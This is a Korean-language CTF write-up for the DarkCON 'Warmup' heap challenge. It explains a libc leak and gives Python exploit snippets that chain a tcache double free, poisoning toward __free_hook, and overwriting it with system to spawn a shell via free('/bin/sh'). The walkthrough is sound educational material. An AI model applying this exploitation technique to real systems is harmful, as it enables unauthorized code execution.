# [DarkCON CTF] Warmup

## Info

+ 30 solves / 482 points

warm up yourself and get the flag!

## Summary

+ double free
+ tcache poisoning
+ hook overwrite

## File

+ Arch : x86-64
+ Library : dynamically linked (libc6_2.27-3ubuntu1.2_amd64)

## Checksec

+ CANARY : Enabled
+ FORTIRY : Disabled
+ NX : Enabled
+ PIE : Disabled
+ RELRO : Partial

## Description

전형적인 `menu` 형식의 문제이다.
문제를 해결하기 위해서 알아야 할 함수는 총 3가지가 있다.

+ main

_reloc.strcpy의 주소를 출력해준다.

+ create

note index : [0, 0x10)

note size : (0,0x20]

malloc()을 호출하고 할당된 힙에 내용을 입력받는다.

+ delete

free()를 호출하고 테이블에 적힌 주소를 초기화하지 않고 그냥 리턴한다.

## Exploit

**Leak libc address**

```python
p.recvuntil(": ")
strcpy = int(p.recv(14),16)
libc = strcpy - 0xb65b0
system = libc + l.symbols["system"]
free_hook = libc + l.symbols["__free_hook"]
```

main에서 주어지는 주소가 strcpy가 아니라 __strcpy_sse2라는 점을 알아낸다면 라이브러리 주소를 쉽게 구할 수 있다.

**Overwrite free_hook**

```python
delete(0)
delete(0)
create(0, 0x10, p64(free_hook))
create(1, 0x10, b"/bin/sh\x00")
create(2, 0x10, p64(system))
delete(1)
```

delete() 함수가 주소를 초기화하지 않기 때문에 단순히 같은 주소를 연속으로 두 번 해제하는 것으로 double free를 유도할 수 있다. 라이브러리 버전이 < 2.29이므로 tcache에 대한 double free 검증이 존재하지 않는다.

이제 free_hook을 system()의 주소로 덮은 후, delete()를 통해 free("/bin/sh")를 호출하면 system("/bin/sh")가 대신 호출되어 쉘을 취득할 수 있다.

## Flag

+ darkCON{shrtflg}